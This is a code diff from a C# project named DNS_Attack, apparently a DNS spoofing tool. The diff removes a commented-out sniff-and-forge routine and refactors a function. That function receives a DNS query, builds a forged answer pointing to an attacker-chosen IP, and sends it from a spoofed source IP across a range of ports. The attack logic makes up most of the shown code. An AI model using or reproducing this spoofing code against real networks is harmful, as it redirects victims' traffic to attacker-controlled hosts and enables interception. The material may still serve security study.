@@ -68,21 +68,7 @@ namespace DNS_Attack {
         }
 
         public void SendFakeAnswerToSniffedQuery(int timeoutMillis, string erroneousIP) {
-            /*try {
-                Sniffer sniffer = new Sniffer(true, Sniffer.putPortInFilter(Sniffer.Filter_IP_AND_UDP_AND_PORT_X_ONLY, dnsPort), true);
-                List<Packet> packets = sniffer.sniff(1);
-                Console.WriteLine(packets.get(0));
-                UDPPacketData udpPacketData = new UDPPacketData(packets.get(0));
-                //UDPSocket udpSocket = new UDPSocket(udpPacketData.GetReceiverPort());
-                byte[] answer = GenerateDNSAnswer(packets.get(0).data, erroneousIP);
-                long loopStopMillis = System.currentTimeMillis() + timeoutMillis;
-                while (System.currentTimeMillis() < loopStopMillis)
-                    //udpSocket.SendUDPPacket(udpPacketData.GetSenderIP(), udpPacketData.GetSenderPort(), answer);
-                    UDPSocket.SendUDPPacketNative(udpPacketData.GetReceiverIP(), udpPacketData.GetReceiverPort(), udpPacketData.GetSenderIP(), udpPacketData.GetSenderPort(), answer);
-                //udpSocket.Close();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }*/
+            Console.WriteLine("This feature is not implemented.");
         }
 
         /* In order for this function to work, the attacked machine
@@ -92,7 +78,7 @@ namespace DNS_Attack {
             try {
                 UDPSocket udpSocket = new UDPSocket(dnsPort);
                 UDPPacketData dnsQueryPacket = udpSocket.ReceiveUDPPacket();
-                byte[] dnsQuery = dnsQueryPacket.GetData();
+                byte[] dnsQuery = dnsQueryPacket.Data;
                 ShowDNSQuery(dnsQuery);
                 byte[] answer = GenerateDNSAnswer(dnsQuery, erroneousIP);
 
@@ -104,9 +90,9 @@ namespace DNS_Attack {
                         int lastPort = Math.Min(assignedPorts + portsByCore, numPorts) - 1;
                         //new Thread(() -> {
                         for (int port = firstPort; port <= lastPort; port++) {
-                            MySocket.SendUDPPacket(fakeSourceIP, dnsPort, dnsQueryPacket.GetSenderIP(), dnsQueryPacket.GetSenderPort(), answer);
+                            MyUDPSocket.SendUDPPacket(fakeSourceIP, dnsPort, dnsQueryPacket.SenderIP, dnsQueryPacket.SenderPort, answer);
                             /*try {
-                                udpSocket.SendUDPPacket(dnsQueryPacket.GetSenderIP(), dnsQueryPacket.GetSenderPort(), answer);
+                                udpSocket.SendUDPPacket(dnsQueryPacket.SenderIP, dnsQueryPacket.SenderPort, answer);
                             } catch (SocketException e) {
                                 Console.WriteLine(e);
                             }*/
